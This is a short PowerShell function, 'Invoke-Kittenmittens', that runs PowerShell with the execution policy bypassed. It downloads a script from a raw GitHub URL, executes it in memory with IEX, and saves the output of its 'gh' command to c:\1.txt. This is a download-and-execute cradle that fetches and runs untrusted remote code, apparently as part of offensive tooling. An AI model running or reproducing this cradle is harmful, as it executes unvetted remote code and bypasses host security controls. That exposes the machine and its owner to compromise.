function Invoke-Kittenmittens
{
	powershell -ep bypass -c IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/gpsqqq/f/master/gh.ps1');
	gh > c:\1.txt
}
